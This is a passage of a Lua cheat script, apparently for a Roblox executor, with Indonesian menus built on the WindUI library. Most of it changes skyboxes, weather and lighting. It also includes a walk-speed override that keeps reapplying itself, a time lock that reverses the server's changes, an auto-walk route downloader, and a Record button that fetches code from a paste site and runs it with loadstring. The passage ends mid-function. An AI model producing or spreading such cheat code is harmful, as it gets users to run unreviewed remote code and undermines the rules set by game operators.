		local a = Lighting:FindFirstChild("Atmosphere") or Instance.new("Atmosphere", Lighting)
		a.Density = 0.35
		a.Offset = 0.25
		a.Haze = 1.3
		a.Decay = Color3.fromRGB(120, 140, 180)

		local b = Lighting:FindFirstChild("BloomEffect") or Instance.new("BloomEffect", Lighting)
		b.Intensity = 0.6
		b.Size = 48
		b.Threshold = 0.7

		local c = Lighting:FindFirstChild("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect", Lighting)
		c.Contrast = 0.1
		c.Saturation = 0.2
		c.Brightness = 0.05
		c.TintColor = Color3.fromRGB(255, 255, 255)

		local s = Lighting:FindFirstChild("SunRaysEffect") or Instance.new("SunRaysEffect", Lighting)
		s.Intensity = 0.25
		s.Spread = 0.5
	end

	local function disableRTX()
		-- Hapus semua efek lighting
		for _, fx in ipairs(Lighting:GetChildren()) do
			if fx:IsA("BloomEffect") 
				or fx:IsA("ColorCorrectionEffect") 
				or fx:IsA("SunRaysEffect")
				or fx:IsA("Atmosphere")
				or fx:IsA("Sky") then
				fx:Destroy()
			end
		end
		
		-- Bersihkan efek weather (hujan/salju)
		clearWeatherEffects()
		
		-- Kembalikan lighting ke default normal
		Lighting.TimeOfDay = "14:00:00"
		Lighting.Brightness = 2
		Lighting.GlobalShadows = true
		Lighting.Technology = Enum.Technology.ShadowMap
		Lighting.FogEnd = 100000
		Lighting.FogStart = 0
		Lighting.FogColor = Color3.fromRGB(191, 191, 191)
		Lighting.Ambient = Color3.fromRGB(0, 0, 0)
		Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
		Lighting.ClockTime = 14
		Lighting.GeographicLatitude = 0
		
		-- Buat skybox default jika belum ada
		if not Lighting:FindFirstChild("Sky") then
			local sky = Instance.new("Sky")
			sky.Name = "Sky"
			sky.Parent = Lighting
		end
	end

	-------------------------------------
	-- UI SECTION
	-------------------------------------

	local Paragraph = SkyboxTab:Paragraph({
		Title = "Skybox Menu",
		Desc = "Berfungsi untuk mengganti tampilan langit (Skybox) di dalam game. Dengan fitur ini, kamu dapat mengubah background langit menjadi lebih keren, gelap, terang, atau sesuai tema yang kamu inginkan. Skybox juga dapat memberikan suasana berbeda pada map, seperti suasana malam, sunset, galaksi, atau efek awan khusus.",
	})

	-- Skybox 1: Mount Velora
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Skybox Mount Velora 🌑",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				
				local sky = Instance.new("Sky")
				sky.Name = "CustomSky"
				sky.SkyboxBk = "rbxassetid://126146408999925"
				sky.SkyboxDn = "rbxassetid://118112392224589"
				sky.SkyboxFt = "rbxassetid://121253817183621"
				sky.SkyboxLf = "rbxassetid://134105463289425"
				sky.SkyboxRt = "rbxassetid://89099449712918"
				sky.SkyboxUp = "rbxassetid://138429250948648"
				
				for _, v in pairs(Lighting:GetChildren()) do
					if v:IsA("Sky") then
						v:Destroy()
					end
				end
				sky.Parent = Lighting

				WindUI:Notify({
					Title = "Skybox Applied",
					Content = "Mount Velora Skybox activated!",
					Duration = 3,
					Icon = "cloud",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Skybox Reset",
					Content = "Skybox dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})
	
	-- Skybox 2: Mount Nanhu
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Skybox Mount Nanhu 🛸",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				
				local sky = Instance.new("Sky")
				sky.Name = "CustomSky"
				sky.SkyboxBk = "rbxassetid://16262356578"
				sky.SkyboxDn = "rbxassetid://16262358026"
				sky.SkyboxFt = "rbxassetid://16262360469"
				sky.SkyboxLf = "rbxassetid://16262362003"
				sky.SkyboxRt = "rbxassetid://16262363873"
				sky.SkyboxUp = "rbxassetid://16262366016"
				
				for _, v in pairs(Lighting:GetChildren()) do
					if v:IsA("Sky") then
						v:Destroy()
					end
				end
				sky.Parent = Lighting

				WindUI:Notify({
					Title = "Skybox Applied",
					Content = "Mount Nanhu Skybox activated!",
					Duration = 3,
					Icon = "cloud",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Skybox Reset",
					Content = "Skybox dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Skybox 3: Pink
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Skybox Pink 🌷",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				
				local sky = Instance.new("Sky")
				sky.Name = "CustomSky"
				sky.SkyboxBk = "rbxassetid://271042516"
				sky.SkyboxDn = "rbxassetid://271077243"
				sky.SkyboxFt = "rbxassetid://271042556"
				sky.SkyboxLf = "rbxassetid://271042310"
				sky.SkyboxRt = "rbxassetid://271042467"
				sky.SkyboxUp = "rbxassetid://271077958"
				
				for _, v in pairs(Lighting:GetChildren()) do
					if v:IsA("Sky") then
						v:Destroy()
					end
				end
				sky.Parent = Lighting

				WindUI:Notify({
					Title = "Skybox Applied",
					Content = "Pink Skybox activated!",
					Duration = 3,
					Icon = "cloud",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Skybox Reset",
					Content = "Skybox dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Skybox 4: Madara
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Skybox Madara 🔥",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				
				local sky = Instance.new("Sky")
				sky.Name = "CustomSky"
				sky.SkyboxBk = "rbxassetid://15493709538"
				sky.SkyboxDn = "rbxassetid://15493710499"
				sky.SkyboxFt = "rbxassetid://15493711616"
				sky.SkyboxLf = "rbxassetid://15493712720"
				sky.SkyboxRt = "rbxassetid://15493713902"
				sky.SkyboxUp = "rbxassetid://15493714708"
				
				for _, v in pairs(Lighting:GetChildren()) do
					if v:IsA("Sky") then
						v:Destroy()
					end
				end
				sky.Parent = Lighting

				WindUI:Notify({
					Title = "Skybox Applied",
					Content = "Madara Skybox activated!",
					Duration = 3,
					Icon = "cloud",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Skybox Reset",
					Content = "Skybox dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Skybox 5: Space Sky 1
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Skybox Space Sky 1 🚀",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				
				local sky = Instance.new("Sky")
				sky.Name = "CustomSky"
				sky.SkyboxBk = "rbxassetid://159454299"
				sky.SkyboxDn = "rbxassetid://159454296"
				sky.SkyboxFt = "rbxassetid://159454293"
				sky.SkyboxLf = "rbxassetid://159454286"
				sky.SkyboxRt = "rbxassetid://159454300"
				sky.SkyboxUp = "rbxassetid://159454288"
				
				for _, v in pairs(Lighting:GetChildren()) do
					if v:IsA("Sky") then
						v:Destroy()
					end
				end
				sky.Parent = Lighting

				WindUI:Notify({
					Title = "Skybox Applied",
					Content = "Space Sky 1 activated!",
					Duration = 3,
					Icon = "cloud",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Skybox Reset",
					Content = "Skybox dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Skybox 6: Space Sky 2
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Skybox Space Sky 2 🚀",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				
				local sky = Instance.new("Sky")
				sky.Name = "CustomSky"
				sky.SkyboxBk = "rbxassetid://15983968922"
				sky.SkyboxDn = "rbxassetid://15983966825"
				sky.SkyboxFt = "rbxassetid://15983965025"
				sky.SkyboxLf = "rbxassetid://15983967420"
				sky.SkyboxRt = "rbxassetid://15983966246"
				sky.SkyboxUp = "rbxassetid://15983964246"
				
				for _, v in pairs(Lighting:GetChildren()) do
					if v:IsA("Sky") then
						v:Destroy()
					end
				end
				sky.Parent = Lighting

				WindUI:Notify({
					Title = "Skybox Applied",
					Content = "Space Sky 2 activated!",
					Duration = 3,
					Icon = "cloud",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Skybox Reset",
					Content = "Skybox dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	SkyboxTab:Divider()

	local Paragraph = SkyboxTab:Paragraph({
		Title = "Weather Menu",
		Desc = "Berfungsi untuk mengatur cuaca mulai dari menambahkan hujan, salju, sunset dll.",
	})

	-- Weather 1: Clear Day
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Clear Day ☀️",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				Lighting.TimeOfDay = "12:00:00"
				Lighting.Brightness = 2
				Lighting.FogEnd = 8000
				applyRTX()

				WindUI:Notify({
					Title = "Weather Applied",
					Content = "Clear Day activated!",
					Duration = 3,
					Icon = "sun",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Weather Reset",
					Content = "Weather dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Weather 2: Moonlight
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Moonlight 🌙",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				Lighting.TimeOfDay = "23:00:00"
				Lighting.Brightness = 0.3
				applyRTX()

				WindUI:Notify({
					Title = "Weather Applied",
					Content = "Moonlight activated!",
					Duration = 3,
					Icon = "moon",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Weather Reset",
					Content = "Weather dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Weather 3: Storm
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Storm ⛈️",
		Callback = function(state)
			if state then
				Lighting.TimeOfDay = "14:00:00"
				Lighting.Brightness = 1
				createRainEffect()
				applyRTX()

				WindUI:Notify({
					Title = "Weather Applied",
					Content = "Storm activated!",
					Duration = 3,
					Icon = "cloud-rain",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Weather Reset",
					Content = "Weather dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Weather 4: Winter
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Winter ❄️",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				Lighting.TimeOfDay = "10:00:00"
				Lighting.Brightness = 3.5
				Lighting.FogColor = Color3.new(0.95, 0.98, 1)
				Lighting.FogEnd = 15000
				Lighting.FogStart = 100
				applyRTX()
				task.wait(0.2)
				createSnowEffect()

				WindUI:Notify({
					Title = "Weather Applied",
					Content = "Winter activated!",
					Duration = 3,
					Icon = "snowflake",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Weather Reset",
					Content = "Weather dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	-- Weather 5: Sunrise
	local Toggle = SkyboxTab:Toggle({
		Title = "[◉] Sunrise 🌅",
		Callback = function(state)
			if state then
				clearWeatherEffects()
				Lighting.TimeOfDay = "06:30:00"
				Lighting.Brightness = 2
				applyRTX()

				WindUI:Notify({
					Title = "Weather Applied",
					Content = "Sunrise activated!",
					Duration = 3,
					Icon = "sunrise",
				})
			else
				disableRTX()
				WindUI:Notify({
					Title = "Weather Reset",
					Content = "Weather dikembalikan ke normal!",
					Duration = 3,
					Icon = "refresh-ccw",
				})
			end
		end
	})

	SkyboxTab:Divider()

	-- Reset Button
	local Button = SkyboxTab:Button({
		Title = "[◉] Reset Lighting",
		Desc = "Kembalikan pencahayaan ke default.",
		Icon = "refresh-ccw",
		Callback = function()
			WindUI:Notify({
				Title = "Resetting...",
				Content = "Mengembalikan lighting...",
				Duration = 2,
				Icon = "loader",
			})
			
			task.wait(0.5)
			disableRTX()
			
			task.wait(0.3)
			WindUI:Notify({
				Title = "Reset Complete",
				Content = "Lighting berhasil dikembalikan!",
				Duration = 3,
				Icon = "check",
			})
		end
	})

end

--| =========================================================== |--
--| PLAYER MENU                                                 |--
--| =========================================================== |--

local function setupPlayermenuTab()
    if not PlayermenuTab then return end
    if getgenv()["_SETUP_DONE_setupPlayermenuTab"] then return end
    getgenv()["_SETUP_DONE_setupPlayermenuTab"] = true

    -- SERVICES
    local Players = game:GetService("Players")
    local Lighting = game:GetService("Lighting")
    local RunService = game:GetService("RunService")

    -- PLAYER REFERENCES
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")

    -- CONNECTION STORAGE
    local nametagConnections = {}
    local wsConnection = nil
    local timeConnection = nil
    local hideNametagEnabled = false

    ----------------------------------------------------------------
    -- SECTION: Nametag Menu
    ----------------------------------------------------------------
    local Section = PlayermenuTab:Section({
        Title = "Nametag Menu",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize = 17,
    })

    -- Fungsi utama hide/show nametag (robust: scan semua BillboardGui di karakter)
    local function hideTagsInChar(char, doHide)
        if not char then return end
        -- Scan semua descendant (bukan hanya Head:GetChildren)
        for _, obj in pairs(char:GetDescendants()) do
            if obj:IsA("BillboardGui") then
                obj.Enabled = not doHide
            end
        end
        -- Khusus Humanoid: hide overhead name via DisplayDistanceType
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function()
                hum.DisplayDistanceType = doHide
                    and Enum.HumanoidDisplayDistanceType.None
                    or  Enum.HumanoidDisplayDistanceType.Subject
                hum.NameDisplayDistance = doHide and 0 or 100
                hum.HealthDisplayDistance = doHide and 0 or 100
            end)
        end
    end

    local function updateNametags()
        for _, plr in pairs(Players:GetPlayers()) do
            hideTagsInChar(plr.Character, hideNametagEnabled)
        end
    end

    -- Fungsi untuk connect player respawn
    local function connectPlayer(plr)
        local c = plr.CharacterAdded:Connect(function(char)
            task.wait(0.3)
            if hideNametagEnabled then
                -- tunggu Head dan descendants muncul
                task.wait(0.5)
                hideTagsInChar(char, true)
                -- watch for new BillboardGui added (beberapa game spawn nametag lambat)
                local watcher = char.DescendantAdded:Connect(function(obj)
                    if hideNametagEnabled and obj:IsA("BillboardGui") then
                        task.wait(0.05)
                        obj.Enabled = false
                    end
                end)
                table.insert(nametagConnections, watcher)
            end
        end)
        table.insert(nametagConnections, c)
    end

    -- Toggle Hide Nametag
    PlayermenuTab:Toggle({
        Title = "Hide Nametag",
        Desc = "Berfungsi untuk menyembunyikan nametag player di semua map.",
        Icon = "check",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            hideNametagEnabled = state
            updateNametags()

            -- Disconnect sebelumnya
            for _, conn in pairs(nametagConnections) do
                if conn.Connected then conn:Disconnect() end
            end
            nametagConnections = {}

            if state then
                -- Connect semua player baru
                for _, plr in pairs(Players:GetPlayers()) do
                    connectPlayer(plr)
                end
                table.insert(nametagConnections, Players.PlayerAdded:Connect(connectPlayer))
            end
        end
    })

    ----------------------------------------------------------------
    -- SECTION: Walk Speed Menu
    ----------------------------------------------------------------
    local Section = PlayermenuTab:Section({
        Title = "Walk Speed Menu",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize = 17,
    })

    local enableWalkSpeed = false
    local targetWalkSpeed = 16

    PlayermenuTab:Toggle({
        Title = "Enable Walk Speed",
        Desc = "Aktifkan enable walk speed terlebih dahulu sebelum set walk speed.",
        Icon = "check",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            enableWalkSpeed = state

            if state then
                humanoid.WalkSpeed = targetWalkSpeed
                if not wsConnection then
                    wsConnection = humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                        if enableWalkSpeed and humanoid.WalkSpeed ~= targetWalkSpeed then
                            humanoid.WalkSpeed = targetWalkSpeed
                        end
                    end)
                end

            else
                if wsConnection then
                    wsConnection:Disconnect()
                    wsConnection = nil
                end
            end
        end
    })

    PlayermenuTab:Slider({
        Title = "Set Walk Speed",
        Desc = "Berfungsi mengatur kecepatan player.",
        Step = 1,
        Value = {
            Min = 16,
            Max = 65,
            Default = 16,
        },
        Callback = function(value)
            targetWalkSpeed = value
            if enableWalkSpeed then
                humanoid.WalkSpeed = targetWalkSpeed
            end
        end
    })

    player.CharacterAdded:Connect(function(char)
        character = char
        humanoid = char:WaitForChild("Humanoid")

        if enableWalkSpeed then
            humanoid.WalkSpeed = targetWalkSpeed

            if wsConnection then
                wsConnection:Disconnect()
                wsConnection = nil
            end

            wsConnection = humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if enableWalkSpeed and humanoid.WalkSpeed ~= targetWalkSpeed then
                    humanoid.WalkSpeed = targetWalkSpeed
                end
            end)
        end

        -- Update nametag jika toggle aktif saat respawn
        if hideNametagEnabled then
            task.wait(0.5)
            updateNametags()
        end
    end)

    ----------------------------------------------------------------
    -- SECTION: Time Menu
    ----------------------------------------------------------------
    local Section = PlayermenuTab:Section({
        Title = "Time Menu",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize = 17,
    })

    local currentTime = 12
    local autoLockTime = false

    PlayermenuTab:Toggle({
        Title = "Lock Time",
        Desc = "Kunci waktu agar server tidak bisa mengubahnya.",
        Icon = "check",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            autoLockTime = state

            if state then
                Lighting.TimeOfDay = string.format("%02d:00:00", math.floor(currentTime))

                if not timeConnection then
                    timeConnection = Lighting:GetPropertyChangedSignal("TimeOfDay"):Connect(function()
                        if autoLockTime then
                            Lighting.TimeOfDay = string.format("%02d:00:00", math.floor(currentTime))
                        end
                    end)
                end

            else
                if timeConnection then
                    timeConnection:Disconnect()
                    timeConnection = nil
                end
            end
        end
    })

    PlayermenuTab:Slider({
        Title = "Set Time",
        Desc = "Atur waktu siang, sore, malam.",
        Step = 1,
        Value = {
            Min = 0,
            Max = 24,
            Default = 12,
        },
        Callback = function(value)
            currentTime = value
            Lighting.TimeOfDay = string.format("%02d:00:00", math.floor(currentTime))

            if autoLockTime then
                Lighting.TimeOfDay = string.format("%02d:00:00", math.floor(currentTime))
            end
        end
    })
end

--| =========================================================== |--
--| SOCIAL MEDIA                                                |--
--| =========================================================== |--

--// SETUP SOCIAL TAB
local function setupSocialTab()
    if not SocialTab then return end
    if getgenv()["_SETUP_DONE_setupSocialTab"] then return end
    getgenv()["_SETUP_DONE_setupSocialTab"] = true


    ----------------------------------------------
    -- PARAGRAPH DISCORD
    ----------------------------------------------
    local Paragraph = SocialTab:Paragraph({
        Title = "Discord",
        Desc = "Join discord untuk mendapatkan update terbaru.",
    })

	SocialTab:Button({
        Title = "[◉] Copy Link Discord",
        Icon = "clipboard",
        Callback = function()
        	if setclipboard then
				setclipboard("https://discord.gg/tXRmdCsSEn")
				WindUI:Notify({
    				Title = "Link Discord",
    				Content = "Berhasil di copy ke clipboard!",
    				Duration = 3,
    				Icon = "clipboard",
				})
            else
                -- Nothing
            end
        end
    })

	SocialTab:Divider()

	local Paragraph = SocialTab:Paragraph({
        Title = "Whatsapp Group",
        Desc = "Buat yang mau Join silahkan hehe.",
    })

	SocialTab:Button({
        Title = "[◉] Copy Link Whatsapp Group",
        Icon = "clipboard",
        Callback = function()
        	if setclipboard then
				setclipboard("https://chat.whatsapp.com/HY80ILr7wyu4f4Lc96qr8E?mode=hqrt3")
				WindUI:Notify({
    				Title = "Link Group Whatsapp",
    				Content = "Berhasil di copy ke clipboard!",
    				Duration = 3,
    				Icon = "clipboard",
				})
            else
                -- Nothing
            end
        end
    })

	SocialTab:Divider()

	local Paragraph = SocialTab:Paragraph({
        Title = "Tiktok",
        Desc = "Jangan lupa follow tiktok Jepin.",
    })

	SocialTab:Button({
        Title = "[◉] Copy Link Tiktok",
        Icon = "clipboard",
        Callback = function()
        	if setclipboard then
				setclipboard("https://www.tiktok.com/@some1666._")
				WindUI:Notify({
    				Title = "Link Tiktok",
    				Content = "Berhasil di copy ke clipboard!",
    				Duration = 3,
    				Icon = "clipboard",
				})
            else
                -- Nothing
            end
        end
    })

	SocialTab:Divider()

	local Paragraph = SocialTab:Paragraph({
        Title = "Website",
        Desc = "Buat yang mau mampir website saya silahkan.",
    })

	SocialTab:Button({
        Title = "[◉] Copy Link Website",
        Icon = "clipboard",
        Callback = function()
        	if setclipboard then
				setclipboard("https://pokayteam.edgeone.app")
				WindUI:Notify({
    				Title = "Link Website",
    				Content = "Berhasil di copy ke clipboard!",
    				Duration = 3,
    				Icon = "clipboard",
				})
            else
                -- Nothing
            end
        end
    })

	SocialTab:Divider()

end

--| =========================================================== |--
--| APPEARANCE TAB SETUP                                        |--
--| =========================================================== |--

local function setupAppearanceTab()
    if not AppearanceTab then return end
    if getgenv()["_SETUP_DONE_setupAppearanceTab"] then return end
    getgenv()["_SETUP_DONE_setupAppearanceTab"] = true


	local Paragraph = AppearanceTab:Paragraph({
		Title = "Themes UI",
		Desc = "Berfungsi untuk menyesuaikan tema ui, yang dimana anda bisa mengatur tema red, dark, white dll, tinggal anda sesuaikan saja.",
	})

	AppearanceTab:Divider()

    local themes = {}
    for themeName, _ in pairs(WindUI:GetThemes()) do
        table.insert(themes, themeName)
    end
    table.sort(themes)

    local canchangedropdown = true

    local themeDropdown = AppearanceTab:Dropdown({
        Title = "[◉] Preset Themes",
        Values = themes,
        Flag = "themeDropdown",
        SearchBarEnabled = true,
        MenuWidth = 280,
        Value = "Sky",
        Callback = function(theme)
            canchangedropdown = false
            WindUI:SetTheme(theme)
            canchangedropdown = true
        end
    })

    local transparencySlider = AppearanceTab:Slider({
        Title = "[◉] Transparency Themes",
        Value = { 
            Min = 0,
            Max = 1,
            Default = 0.3,
        },
        Flag = "transparencySlider",
        Step = 0.1,
        Callback = function(value)
            Window:SetBackgroundTransparency(value)
            Window:SetBackgroundImageTransparency(value)
        end
    })

	AppearanceTab:Divider()
	
end

--| =========================================================== |--
--| UPDATE CHECKPOINT TAB SETUP                                 |--
--| =========================================================== |--

local function setupUpdatecheckpointTab()
    if not UpdatecheckpointTab then return end
    if getgenv()["_SETUP_DONE_setupUpdatecheckpointTab"] then return end
    getgenv()["_SETUP_DONE_setupUpdatecheckpointTab"] = true
    
    local updateEnabled = false
    local stopUpdate = {false}
    
    UpdatecheckpointTab:Divider()
    
    UpdatecheckpointTab:Paragraph({
        Title = "Update Checkpoint",
        Desc = "Berfungsi untuk mengupdate ulang semua checkpoint dari track yang sudah dipilih. Pastikan Anda sudah memilih track di menu Auto Walk terlebih dahulu.",
    })
    
    UpdatecheckpointTab:Divider()
    
    local UpdateToggle = UpdatecheckpointTab:Toggle({
        Title = "[◉] UPDATE CHECKPOINT",
        Desc = "Berfungsi untuk mengupdate ulang semua checkpoint dari track yang dipilih.",
        Icon = "check",
        Type = "Checkbox",
        Value = false,
        Callback = function(state) 
            if state then
                -- Get data from global env (shared from setupAutowalkTab)
                local currentTrack = getgenv().AutoWalk_CurrentTrack
                local currentJsonFolder = getgenv().AutoWalk_CurrentJsonFolder
                local currentBaseURL = getgenv().AutoWalk_CurrentBaseURL
                local currentJsonFiles = getgenv().AutoWalk_CurrentJsonFiles
                
                if not currentTrack then
                    WindUI:Notify({
                        Title = "Error",
                        Content = "Pilih track terlebih dahulu di menu Auto Walk!",
                        Duration = 3,
                        Icon = "alert-triangle"
                    })
                    UpdateToggle:Set(false)
                    return
                end
                
                updateEnabled = true
                stopUpdate[1] = false
                task.spawn(function()
                    WindUI:Notify({
                        Title = "Update Checkpoint",
                        Content = "Memulai proses update untuk " .. currentTrack .. "...",
                        Duration = 2,
                        Icon = "refresh-cw"
                    })
                    
                    -- Hapus semua file lama
                    for _, fileName in ipairs(currentJsonFiles) do
                        local filePath = currentJsonFolder .. "/" .. fileName
                        if isfile(filePath) then
                            delfile(filePath)
                        end
                    end
                    
                    -- Download ulang semua file
                    local successCount = 0
                    local failCount = 0
                    
                    for i, fileName in ipairs(currentJsonFiles) do
                        if stopUpdate[1] then 
                            WindUI:Notify({
                                Title = "Update Checkpoint",
                                Content = "Update dibatalkan!",
                                Duration = 3,
                                Icon = "x-circle"
                            })
                            break 
                        end
                        
                        if i % 10 == 0 or i == #currentJsonFiles then
                            WindUI:Notify({
                                Title = "Update Checkpoint",
                                Content = string.format("Progress: %d/%d", i, #currentJsonFiles),
                                Duration = 1.5,
                                Icon = "download"
                            })
                        end
                        
                        local success, response = pcall(function()
                            return game:HttpGet(currentBaseURL .. fileName)
                        end)
                        
                        if success and response and #response > 0 then
                            writefile(currentJsonFolder .. "/" .. fileName, response)
                            successCount = successCount + 1
                        else
                            failCount = failCount + 1
                        end
                        task.wait(0.3)
                    end
                    
                    if not stopUpdate[1] then
                        WindUI:Notify({
                            Title = "Update Selesai",
                            Content = string.format("Berhasil: %d | Gagal: %d", successCount, failCount),
                            Duration = 5,
                            Icon = "check-check"
                        })
                    end
                    
                    UpdateToggle:Set(false)
                end)
            else
                updateEnabled = false
                stopUpdate[1] = true
            end
        end,
    })
    
    UpdatecheckpointTab:Divider()
end

local function setupRecordTab()
    if not RecordTab then return end
    if getgenv()["_SETUP_DONE_setupRecordTab"] then return end
    getgenv()["_SETUP_DONE_setupRecordTab"] = true

    RecordTab:Paragraph({
        Title = "🎬 Script Recorder",
        Desc  = "Klik tombol di bawah untuk menjalankan Script Recorder.",
    })

    RecordTab:Divider()

    RecordTab:Button({
        Title    = "[▶] Launch Script Recorder",
        Desc     = "Execute recorder langsung tanpa verifikasi ulang.",
        Icon     = "video",
        Callback = function()
            WindUI:Notify({
                Title   = "🎬 Memuat Recorder...",
                Content = "Harap tunggu sebentar.",
                Duration = 3,
                Icon    = "loader",
            })
            task.spawn(function()
                local ok, err = pcall(function()
                    loadstring(game:HttpGet("https://pastefy.app/3GRcdSZg/raw"))()
                end)
                if ok then
                    WindUI:Notify({
                        Title   = "🎬 Recorder Aktif",
                        Content = "Script Recorder berhasil dijalankan!",
                        Duration = 3,
                        Icon    = "video",
                    })
                else
                    WindUI:Notify({
                        Title   = "❌ Gagal Memuat Recorder",
                        Content = tostring(err):sub(1, 80),
                        Duration = 5,
                        Icon    = "x-circle",
                    })
                end
            end)
        end
    })

    RecordTab:Divider()

    RecordTab:Paragraph({
        Title = "ℹ️ Cara Pakai",
        Desc  = "1. Klik tombol Launch Script Recorder\n"
              .."2. Tunggu beberapa detik\n"
              .."3. UI Recorder akan muncul otomatis",
    })

    RecordTab:Divider()
end
local function setupUploadTab()
    if not UploadTab then return end
    if getgenv()["_SETUP_DONE_setupUploadTab"] then return end
    getgenv()["_SETUP_DONE_setupUploadTab"] = true

    -- Hanya Owner dan Admin yang bisa akses tab ini
    if not isOwnerOrAdmin() then
        UploadTab:Paragraph({
            Title = "🔒 Akses Ditolak",
            Desc  = "Tab Upload hanya bisa diakses oleh Owner dan Admin.\n"
                  .."Role kamu saat ini: " .. getRoleLabel() .. "\n\n"
                  .."Hubungi Owner jika kamu merasa ini salah.",
        })
        return
    end

    local HttpService = game:GetService("HttpService")
    local selectedFile = nil   -- {name, jsonStr, placeId, frames}
    local mapName      = ""
    local jsonFilePath = ""

    -- Pure Lua base64 encoder
    local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local function toBase64(data)
        local result, len = {}, #data
        for i = 1, len, 3 do
            local b1 = data:byte(i) or 0
            local b2 = data:byte(i+1) or 0
            local b3 = data:byte(i+2) or 0
            local n  = b1*65536 + b2*256 + b3
            result[#result+1] = b64chars:sub(math.floor(n/262144)%64+1, math.floor(n/262144)%64+1)
            result[#result+1] = b64chars:sub(math.floor(n/4096)%64+1,   math.floor(n/4096)%64+1)
            result[#result+1] = (i+1<=len) and b64chars:sub(math.floor(n/64)%64+1, math.floor(n/64)%64+1) or "="
            result[#result+1] = (i+2<=len) and b64chars:sub(n%64+1, n%64+1) or "="
        end
        return table.concat(result)
    end

    -- Detect PlaceID dari isi JSON
    local function detectPlaceId(decoded)
        local fields = {"placeId","place_id","PlaceId","gameId","game_id"}
        for _, f in ipairs(fields) do
            if decoded[f] then return tostring(decoded[f]) end
        end
        for _, sub in ipairs({"meta","info","metadata"}) do
            if type(decoded[sub]) == "table" then
                local v = decoded[sub].placeId or decoded[sub].place_id
                if v then return tostring(v) end
            end
        end
        return tostring(game.PlaceId)
    end

    -- ========== UI ==========

    -- Info role
    local roleDesc = ""
    if isOwnerOrAdmin() then
        roleDesc = getRoleLabel() .. " → Upload masuk ke 🌐 PUBLIC (wiwokdetok)\nBisa dilihat semua user."
    elseif isDonatur() then
        roleDesc = getRoleLabel() .. " → Upload masuk ke ⭐ DONATUR\nHanya donatur & owner/admin."
    else
        roleDesc = getRoleLabel() .. " → Upload masuk ke 🔒 PRIVATE\nHanya kamu & owner/admin."
    end

    UploadTab:Paragraph({
        Title = "📋 Info Akses Upload",
        Desc  = roleDesc
              .. "\n\n📌 Place ID otomatis terisi dari game aktif: " .. tostring(game.PlaceId)
              .. "\n📁 File diambil dari folder: PokayRecorder",
    })

    UploadTab:Divider()

    UploadTab:Paragraph({
        Title = "📖 Cara Upload",
        Desc  = "1. Klik [🔍 Scan Folder] untuk memuat daftar file rekaman\n"
              .. "2. Pilih file dari dropdown\n"
              .. "3. Isi Nama Map\n"
              .. "4. Klik UPLOAD ke GitHub\n\n"
              .. "📌 File diambil dari folder: PokayRecorder\n"
              .. "📌 Place ID otomatis terisi dari game aktif.",
    })

    UploadTab:Divider()

    -- Folder sumber rekaman
    local RECORDER_FOLDER = "PokayRecorder"

    -- Fungsi scan file .json dari folder PokayRecorder
    local function scanRecorderFiles()
        local fileList = {}
        if not isfolder(RECORDER_FOLDER) then
            return fileList, "Folder '" .. RECORDER_FOLDER .. "' tidak ditemukan!"
        end
        local ok, items = pcall(function() return listfiles(RECORDER_FOLDER) end)
